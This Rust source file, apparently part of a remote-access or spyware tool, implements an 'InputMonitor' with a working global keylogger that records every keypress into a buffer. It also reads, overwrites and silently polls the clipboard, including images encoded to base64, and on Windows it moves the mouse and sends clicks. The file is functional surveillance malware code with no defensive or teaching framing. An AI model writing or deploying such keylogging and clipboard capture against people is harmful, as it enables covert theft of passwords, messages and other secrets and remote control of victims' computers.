// Input monitoring module - Keylogger and Clipboard

use std::sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}};
use std::thread;
use arboard::Clipboard;
use chrono::Local;

pub struct InputMonitor {
    keylog_running: Arc<AtomicBool>,
    keylog_buffer: Arc<Mutex<String>>,
}

impl InputMonitor {
    pub fn new() -> Self {
        Self {
            keylog_running: Arc::new(AtomicBool::new(false)),
            keylog_buffer: Arc::new(Mutex::new(String::new())),
        }
    }
    
    /// Start keylogger
    pub fn start_keylogger(&self) -> Result<(), Box<dyn std::error::Error>> {
        if self.keylog_running.load(Ordering::SeqCst) {
            return Ok(()); // Already running
        }
        
        self.keylog_running.store(true, Ordering::SeqCst);
        
        let running = self.keylog_running.clone();
        let buffer = self.keylog_buffer.clone();
        
        thread::spawn(move || {
            use rdev::{listen, Event, EventType, Key};
            
            let callback = move |event: Event| {
                if !running.load(Ordering::SeqCst) {
                    return;
                }
                
                if let EventType::KeyPress(key) = event.event_type {
                    let key_str = match key {
                        Key::Alt => "[ALT]",
                        Key::AltGr => "[ALTGR]",
                        Key::Backspace => "[BACKSPACE]",
                        Key::CapsLock => "[CAPSLOCK]",
                        Key::ControlLeft | Key::ControlRight => "[CTRL]",
                        Key::Delete => "[DEL]",
                        Key::DownArrow => "[DOWN]",
                        Key::End => "[END]",
                        Key::Escape => "[ESC]",
                        Key::F1 => "[F1]",
                        Key::F2 => "[F2]",
                        Key::F3 => "[F3]",
                        Key::F4 => "[F4]",
                        Key::F5 => "[F5]",
                        Key::F6 => "[F6]",
                        Key::F7 => "[F7]",
                        Key::F8 => "[F8]",
                        Key::F9 => "[F9]",
                        Key::F10 => "[F10]",
                        Key::F11 => "[F11]",
                        Key::F12 => "[F12]",
                        Key::Home => "[HOME]",
                        Key::LeftArrow => "[LEFT]",
                        Key::MetaLeft | Key::MetaRight => "[WIN]",
                        Key::PageDown => "[PAGEDOWN]",
                        Key::PageUp => "[PAGEUP]",
                        Key::Return => "[ENTER]\n",
                        Key::RightArrow => "[RIGHT]",
                        Key::ShiftLeft | Key::ShiftRight => "[SHIFT]",
                        Key::Space => " ",
                        Key::Tab => "[TAB]",
                        Key::UpArrow => "[UP]",
                        Key::PrintScreen => "[PRINTSCREEN]",
                        Key::ScrollLock => "[SCROLLLOCK]",
                        Key::Pause => "[PAUSE]",
                        Key::NumLock => "[NUMLOCK]",
                        Key::Insert => "[INSERT]",
                        Key::Num0 => "0",
                        Key::Num1 => "1",
                        Key::Num2 => "2",
                        Key::Num3 => "3",
                        Key::Num4 => "4",
                        Key::Num5 => "5",
                        Key::Num6 => "6",
                        Key::Num7 => "7",
                        Key::Num8 => "8",
                        Key::Num9 => "9",
                        Key::KeyA => "a",
                        Key::KeyB => "b",
                        Key::KeyC => "c",
                        Key::KeyD => "d",
                        Key::KeyE => "e",
                        Key::KeyF => "f",
                        Key::KeyG => "g",
                        Key::KeyH => "h",
                        Key::KeyI => "i",
                        Key::KeyJ => "j",
                        Key::KeyK => "k",
                        Key::KeyL => "l",
                        Key::KeyM => "m",
                        Key::KeyN => "n",
                        Key::KeyO => "o",
                        Key::KeyP => "p",
                        Key::KeyQ => "q",
                        Key::KeyR => "r",
                        Key::KeyS => "s",
                        Key::KeyT => "t",
                        Key::KeyU => "u",
                        Key::KeyV => "v",
                        Key::KeyW => "w",
                        Key::KeyX => "x",
                        Key::KeyY => "y",
                        Key::KeyZ => "z",
                        _ => "",
                    };
                    
                    if !key_str.is_empty() {
                        if let Ok(mut buf) = buffer.lock() {
                            buf.push_str(key_str);
                        }
                    }
                }
            };
            
            let _ = listen(callback);
        });
        
        Ok(())
    }
    
    /// Stop keylogger and return captured keys
    pub fn stop_keylogger(&self) -> Result<String, Box<dyn std::error::Error>> {
        self.keylog_running.store(false, Ordering::SeqCst);
        
        let mut buffer = self.keylog_buffer.lock()
            .map_err(|e| format!("Lock error: {}", e))?;
        
        let logs = buffer.clone();
        buffer.clear();
        
        Ok(logs)
    }
    
    /// Get current keylog buffer without stopping
    pub fn get_keylog(&self) -> Result<String, Box<dyn std::error::Error>> {
        let buffer = self.keylog_buffer.lock()
            .map_err(|e| format!("Lock error: {}", e))?;
        
        Ok(buffer.clone())
    }
    
    /// Clear keylog buffer
    pub fn clear_keylog(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut buffer = self.keylog_buffer.lock()
            .map_err(|e| format!("Lock error: {}", e))?;
        
        buffer.clear();
        Ok(())
    }
    
    /// Is keylogger running
    pub fn is_keylogging(&self) -> bool {
        self.keylog_running.load(Ordering::SeqCst)
    }
    
    /// Get clipboard content
    pub fn get_clipboard(&self) -> Result<String, Box<dyn std::error::Error>> {
        let mut clipboard = Clipboard::new()?;
        Ok(clipboard.get_text().unwrap_or_default())
    }
    
    /// Set clipboard content
    pub fn set_clipboard(&self, text: &str) -> Result<(), Box<dyn std::error::Error>> {
        let mut clipboard = Clipboard::new()?;
        clipboard.set_text(text)?;
        Ok(())
    }
    
    /// Get clipboard image as base64
    pub fn get_clipboard_image(&self) -> Result<String, Box<dyn std::error::Error>> {
        let mut clipboard = Clipboard::new()?;
        
        if let Ok(img) = clipboard.get_image() {
            use image::{DynamicImage, RgbaImage, ImageOutputFormat};
            use std::io::Cursor;
            use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
            
            let rgba = RgbaImage::from_raw(
                img.width as u32,
                img.height as u32,
                img.bytes.into_owned(),
            ).ok_or("Failed to create image")?;
            
            let dynamic_img = DynamicImage::ImageRgba8(rgba);
            
            let mut jpeg_bytes = Vec::new();
            dynamic_img.write_to(&mut Cursor::new(&mut jpeg_bytes), ImageOutputFormat::Png)?;
            
            Ok(BASE64.encode(&jpeg_bytes))
        } else {
            Err("No image in clipboard".into())
        }
    }
    
    /// Monitor clipboard changes
    pub fn start_clipboard_monitor<F>(&self, callback: F) -> Result<(), Box<dyn std::error::Error>>
    where
        F: Fn(String) + Send + 'static,
    {
        thread::spawn(move || {
            let mut last_content = String::new();
            
            loop {
                if let Ok(mut clipboard) = Clipboard::new() {
                    if let Ok(content) = clipboard.get_text() {
                        if content != last_content {
                            last_content = content.clone();
                            callback(content);
                        }
                    }
                }
                
                thread::sleep(std::time::Duration::from_secs(1));
            }
        });
        
        Ok(())
    }
}

impl Default for InputMonitor {
    fn default() -> Self {
        Self::new()
    }
}

// Mouse tracking (optional)
pub struct MouseTracker;

impl MouseTracker {
    pub fn get_position() -> (i32, i32) {
        #[cfg(windows)]
        {
            use winapi::um::winuser::GetCursorPos;
            use winapi::shared::windef::POINT;
            
            let mut point = POINT { x: 0, y: 0 };
            unsafe {
                GetCursorPos(&mut point);
            }
            (point.x, point.y)
        }
        
        #[cfg(not(windows))]
        {
            (0, 0)
        }
    }
    
    pub fn set_position(x: i32, y: i32) {
        #[cfg(windows)]
        {
            use winapi::um::winuser::SetCursorPos;
            unsafe {
                SetCursorPos(x, y);
            }
        }
    }
    
    pub fn click(button: &str) {
        #[cfg(windows)]
        {
            use winapi::um::winuser::{mouse_event, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, 
                MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP};
            
            unsafe {
                match button {
                    "left" => {
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    },
                    "right" => {
                        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                    },
                    _ => {}
                }
            }
        }
    }
}
